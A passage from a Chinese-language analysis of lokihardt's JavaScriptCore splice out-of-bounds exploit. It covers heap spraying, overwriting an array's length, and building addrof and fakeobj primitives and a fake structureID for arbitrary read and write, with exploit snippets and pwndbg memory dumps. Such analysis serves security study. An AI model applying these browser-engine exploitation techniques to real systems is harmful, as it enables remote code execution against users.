    0x7fe00028c048: 0x00007fffb1a65cc0  0x0000000000000000
    0x7fe00028c058: 0x0000000000000000  0x0000000000000000
    0x7fe00028c068: 0x0000000d0000000a  0x0000000000001337
    0x7fe00028c078: 0x402abd70a3d70a3d  0x402abd70a3d70a3d
    0x7fe00028c088: 0x402abd70a3d70a3d  0x402abd70a3d70a3d
    0x7fe00028c098: 0x402abd70a3d70a3d  0x402abd70a3d70a3d
    0x7fe00028c0a8: 0x402abd70a3d70a3d  0x402abd70a3d70a3d
    0x7fe00028c0b8: 0x40c735af5c28f5c3  0x7ff8000000000000
    0x7fe00028c0c8: 0x7ff8000000000000  0x7ff8000000000000
    0x7fe00028c0d8: 0x0000000d0000000a  0x00007fffb1a65d00
    0x7fe00028c0e8: 0x00007fffb1a65d40  0x00007fffb1a65d80
    0x7fe00028c0f8: 0x00007fffb1a65dc0  0x00007fffb1a65e00
    0x7fe00028c108: 0x00007fffb1a65e40  0x00007fffb1a65e80
    0x7fe00028c118: 0x00007fffb1a65ec0  0x00007fffb1a65f00
    0x7fe00028c128: 0x00007fffb1a65f40  0x0000000000000000
    0x7fe00028c138: 0x0000000000000000  0x0000000000000000
    0x7fe00028c148: 0x0000000d0000000a  0x0000000000001337
    0x7fe00028c158: 0x402abd70a3d70a3d  0x402abd70a3d70a3d
    0x7fe00028c168: 0x402abd70a3d70a3d  0x402abd70a3d70a3d
构造addrof：spray[i+1][0]=obj，jsc会在0x7fe00028c0e8的位置保存obj的地址指针，在
**0x7fe00028c0e8的位置保存obj的内容，这样我们通过读spray[i][14]的内容即可实现读对象的地址** 。
构造fakeobj：spray[i][14]=addr，此时spray[i+1][0]的位置即为addr，由于spray[i+1]为ArrayWithContiguous类型即spray[i+1][x]中保存的是类似obj的对象，这样spray[i+1][0]即为我们构造的fakeobj对象。
再解释下堆喷的数组元素个数是10个。要理解堆喷元素个数首先要理解的一点是lokihardt利用的思路，如果我们可以修改堆喷的数组长度使spray[i]可以访问到spray[i+1][xx]就可以构造fakeobj和addrof原语，而正常情况下不修改数组长度spray[i]肯定是不能访问到spray[i+1]的，那么如何修改堆喷数组的长度呢？可能的思路有两个：
  1. 堆喷后手动触发GC调用splice添加元素使调用splice时新添加的storage的butterfly正好落在spray[i]里（即在spray[i]处伪造一个butterfly并修改spray[i]的length），但是这个方法明显的缺陷就是触发GC的时机和新的butterfly太难控制了，控制不当jsc肯定会崩溃；
  2. 调试发现exp中splice添加元素的过程会触发创建新的butterfly的操作，新创建的butterfly会落在最后一个堆喷数组的后面（spray[0x3000].butterfly的后面），配合unshiftCountWithArrayStorage中的memmove可以达到修改堆喷数组长度的效果，这也是这个漏洞为什么会被描述为OOB的根本原因。
第一次arr.splice(0, 0x11)删除元素时arr的存储
    --> Object: 0x7fffb30b4370 with butterfly 0x7ff0000fe948 (Structure 0x7fffb30f2b50:[Array, {}, ArrayWithArrayStorage, Proto:0x7fffb30c80a0, Leaf]), StructureID: 100
堆喷后调用arr.splice(0x1000,0,1)添加元素，unshiftCountWithArrayStorage处理exp中的arr时会调用到unshiftCountSlowCase，并在tryCreateUninitialized中创建新的storage，大小为88=0x58
字节对齐后为0x50，为了防止随后的memmove移动内存过程中破坏内存，堆喷的数组元素个数申请了10个。
unshiftCountWithArrayStorage在创建完新的storage后会初始化新的storage，即memmove的过程，exp中会执行到以下流程
这里dst=0x7ff000287a78即arr新的butterfly+0x10的位置，src=0x7ff000287a80，n=0x8000即将0x7ff000287a80开始0x8000的内存整体前移8字节，这里会使堆喷数组中某个spray[i][0]的元素覆盖到`*(dword\*)(&spray[i]-8)`的位置，即0x1337覆盖到spray[i]的length域
    pwndbg> x/20xg 0x7ff000287a78-0x40
    0x7ff000287a38: 0x00000000badbeef0  0x00000000badbeef0
    0x7ff000287a48: 0x00000000badbeef0  0x00000000badbeef0
    0x7ff000287a58: 0x00000000badbeef0  0x00000002fffffff0
    0x7ff000287a68: 0x0000000000000000  0xfffffff000000006
    0x7ff000287a78: 0x00000000badbeef0  0x0000000000000000
    0x7ff000287a88: 0x00000000badbeef0  0x00000000badbeef0
    0x7ff000287a98: 0x00000000badbeef0  0x00000000badbeef0
    0x7ff000287aa8: 0x00000000badbeef0  0x00000000badbeef0
    0x7ff000287ab8: 0x00000000badbeef0  0x00000000badbeef0
    0x7ff000287ac8: 0x00000000badbeef0  0x00000000badbeef0
被覆盖前的堆喷数组
    pwndbg> x/20xg 0x7fe00028c078-0x40
    0x7fe00028c038: 0x00007fffb1c69c00  0x00007fffb1c69c40
    0x7fe00028c048: 0x00007fffb1c69c80  0x00007fffb1c69cc0
    0x7fe00028c058: 0x0000000000000000  0x0000000000000000
    0x7fe00028c068: 0x0000000000000000  0x0000000d0000000a  //length
    0x7fe00028c078: 0x0000000000001337  0x402abd70a3d70a3d
    0x7fe00028c088: 0x402abd70a3d70a3d  0x402abd70a3d70a3d
    0x7fe00028c098: 0x402abd70a3d70a3d  0x402abd70a3d70a3d
    0x7fe00028c0a8: 0x402abd70a3d70a3d  0x402abd70a3d70a3d
    0x7fe00028c0b8: 0x402abd70a3d70a3d  0x40c735af5c28f5c3
    0x7fe00028c0c8: 0x7ff8000000000000  0x7ff8000000000000
被覆盖后的堆喷数组
    pwndbg> x/20xg 0x7fe00028c078-0x40
    0x7fe00028c038: 0x00007fffb1a65c40  0x00007fffb1a65c80
    0x7fe00028c048: 0x00007fffb1a65cc0  0x0000000000000000
    0x7fe00028c058: 0x0000000000000000  0x0000000000000000
    0x7fe00028c068: 0x0000000d0000000a  0x0000000000001337  //length
    0x7fe00028c078: 0x402abd70a3d70a3d  0x402abd70a3d70a3d
    0x7fe00028c088: 0x402abd70a3d70a3d  0x402abd70a3d70a3d
    0x7fe00028c098: 0x402abd70a3d70a3d  0x402abd70a3d70a3d
    0x7fe00028c0a8: 0x402abd70a3d70a3d  0x402abd70a3d70a3d
    0x7fe00028c0b8: 0x40c735af5c28f5c3  0x7ff8000000000000
    0x7fe00028c0c8: 0x7ff8000000000000  0x7ff8000000000000
到这里我们就可以控制一个可以越界访问的ArrayWithDouble类型数组spray[i]了，通过搜索内存找到length不为0xa的堆喷数组进而可以构造addrof和fakeobj原语。
#### arbitrary code execute
lokihardt构造任意地址读写原语的思路是构造一个ArrayWithDouble的数组victim，利用漏洞版本jsc相同数据类型structureID并不会随机化并根据i32和f64在内存中存储位置相同构造fake
structureID，构造ArrayWithArrayStorage类型的fakeobj记为hax使hax的butterfly指向victim，通过修改hax[1]即victim的butterfly为addr同时修改victim的prop实现任意地址读写。
##### fake structureID
构造victim
    victim = [1.1];
    victim[0] =3.3;
    victim['prop'] = 13.37;
    victim['prop'+1] = 13.37;
victim = [1.1]此时构造的victim的类型为CopyOnWriteArrayWithDouble，victim[0]
=3.3重新分配butterfly并修改victim类型为ArrayWithDouble。jsc中这两种类型并不一样。ArrayWithDouble的victim存储如下，可以看到prop存储在`*(dword\*)(butterfly-0x10)`的位置。
    [*] victim:
    --> Object: 0x7fffb1a551f0 with butterfly 0x7ff000280058 (Structure 0x7fffb3070d90:[Array, {prop:100, prop1:101}, ArrayWithDouble, Proto:0x7fffb30c80a0, Leaf]), StructureID: 318
    pwndbg> x/6xg 0x7fffb1a551f0
    0x7fffb1a551f0: 0x010821070000013e  0x00007ff000280058
    0x7fffb1a55200: 0x00000000badbeef0  0x00000000badbeef0
    0x7fffb1a55210: 0x00000000badbeef0  0x00000000badbeef0
    pwndbg> x/10xg 0x00007ff000280058-0x20
    0x7ff000280038: 0x0000000000000000  0x402bbd70a3d70a3d
    0x7ff000280048: 0x402bbd70a3d70a3d  0x0000000100000001
    0x7ff000280058: 0x400a666666666666  0x00000000badbeef0
    0x7ff000280068: 0x00000000badbeef0  0x00000000badbeef0
    0x7ff000280078: 0x00000000badbeef0  0x00000000badbeef0
构造fakeobj
    i32[0]=100;
    i32[1]=0x01082107 - 0x10000;
    var container={
        jscell:f64[0],
        butterfly:victim,
    }
需要注意在jsc中构造fakeobj时需要绕过structureID，structureID相同的才具有相同methodTable并被jsc视为相同类型。漏洞版本的jsc并不会在每次启动时随机化相同数据类型的structureID，这里lokihardt把structureID初始化为了0x64即arr的ArrayWithArrayStorage类型。这里fakeobj的类型是固定的，构造ArrayWithArrayStorage类型hax的原因是ArrayWithArrayStorage的数据直接存储在butterfly里，我们可以访问到的hax[1]即为victim的butterfly。
    [*] arr:
    --> Object: 0x7fffb30b4370 with butterfly 0x7fe0000fe948 (Structure 0x7fffb30f2b50:[Array, {}, ArrayWithArrayStorage, Proto:0x7fffb30c80a0, Leaf]), StructureID: 100
    [*] hax: 
    --> Object: 0x7fffb30c8390 with butterfly 0x7fffb1a551f0 (Structure 0x7fffb30f2b50:[Array, {}, ArrayWithArrayStorage, Proto:0x7fffb30c80a0, Leaf]), StructureID: 100
漏洞版本的jsc在解析如下代码时保存i32和f64内容的位置实际上是相同的（这里我是调试发现的，可能是因为WastefulTypedArray类型？下文有jsc中WastefulTypedArray类型的存储方式解释）。
    var conversion_buffer = new ArrayBuffer(8)
    var f64 = new Float64Array(conversion_buffer)
    var i32 = new Uint32Array(conversion_buffer)
存储结构
    [*] i32
    --> Object: 0x7fffb30c8360 with butterfly 0x7fe0000e0018 (Structure 0x7fffb3070a80:[Uint32Array, {}, NonArray, Proto:0x7fffb30b4360, Leaf]), StructureID: 311
    [*] f64
    --> Object: 0x7fffb30c8340 with butterfly 0x7fe0000e0008 (Structure 0x7fffb30707e0:[Float64Array, {}, NonArray, Proto:0x7fffb30b4350, Leaf]), StructureID: 305
    [*] conversion_buffer:
    --> Object: 0x7fffb30c8320 with butterfly (nil) (Structure 0x7fffb30f3640:[ArrayBuffer, {}, NonArray, Proto:0x7fffb30c81e0, Leaf]), StructureID: 125
这里i32和f64的butterfly存储的都不是它们的实际内容，实际存储i32和f64内容的位置位于`*(dword\*)(i32+0x10)`即0x00007fe8000ff000里
    pwndbg> x/20xg 0x7fffb30c8320
    0x7fffb30c8320: 0x010023000000007d  0x0000000000000000
    0x7fffb30c8330: 0x00007ffff3a8a600  0x00000000badbeef0
    0x7fffb30c8340: 0x01082c0000000131  0x00007fe0000e0008
    0x7fffb30c8350: 0x00007fe8000ff000  0x0000000200000001
    0x7fffb30c8360: 0x01082a0000000137  0x00007fe0000e0018
    0x7fffb30c8370: 0x00007fe8000ff000  0x0000000200000002
    0x7fffb30c8380: 0x0100160000000140  0x0000000000000000
    0x7fffb30c8390: 0x0001000000001337  0x00007fffb1c551f0
    0x7fffb30c83a0: 0x00000000badbeef0  0x00000000badbeef0
    0x7fffb30c83b0: 0x00000000badbeef0  0x00000000badbeef0
    pwndbg> x/20xg 0x00007fe0000e0008-0x40
    0x7fe0000dffc8: 0x0000000000000000  0x0000000000000000
    0x7fe0000dffd8: 0x0000000000000000  0x0000000000000000
    0x7fe0000dffe8: 0x0000000000000000  0x0000000000000000
    0x7fe0000dfff8: 0x00000000badbeef0  0x00007ffff3a8a600
    0x7fe0000e0008: 0x00000000badbeef0  0x00007ffff3a8a600
    0x7fe0000e0018: 0x00000000badbeef0  0x00000000badbeef0
    0x7fe0000e0028: 0x00000000badbeef0  0x00000000badbeef0
    0x7fe0000e0038: 0x00000000badbeef0  0x00000000badbeef0
    0x7fe0000e0048: 0x00000000badbeef0  0x00000000badbeef0
    0x7fe0000e0058: 0x00000000badbeef0  0x00000000badbeef0
    pwndbg> x/10xg 0x00007fe8000ff000-0x10
    0x7fe8000feff0: 0x0000000000000000  0x0000000000000000
    0x7fe8000ff000: 0x0000000000001337  0x0000000000000000
    0x7fe8000ff010: 0x0000000000000000  0x0000000000000000
    0x7fe8000ff020: 0x0000000000000000  0x0000000000000000
    0x7fe8000ff030: 0x0000000000000000  0x0000000000000000
而且经过调试可以发现container中保存exp中jscell位置的值比i32中高8位的值大0x10000，所以exp中i32高8位-0x10000。
    [*] container:
    --> Object: 0x7fffb30c8380 with butterfly (nil) (Structure 0x7fffb3070e70:[Object, {jscell:0, butterfly:1}, NonArray, Proto:0x7fffb30b4000, Leaf]), StructureID: 320
    pwndbg> x/10xg 0x7fffb30c8380
    0x7fffb30c8380: 0x0100160000000140  0x0000000000000000
    0x7fffb30c8390: 0x0001000000001337  0x00007fffb1c551f0
    0x7fffb30c83a0: 0x00000000badbeef0  0x00000000badbeef0
    0x7fffb30c83b0: 0x00000000badbeef0  0x00000000badbeef0
    0x7fffb30c83c0: 0x00000000badbeef0  0x00000000badbeef0
关于i32和f64使用相同内存存储，在JSArrayBufferView.h中有解释WastefulTypedArray类型的存储，WastefulTypedArray类型的butterfly并不包含vector。
        // A typed array that was used in some crazy way. B's IndexingHeader
        // is hijacked to contain a reference to the native array buffer. The
        // native typed array view points back to the JS view. V points to a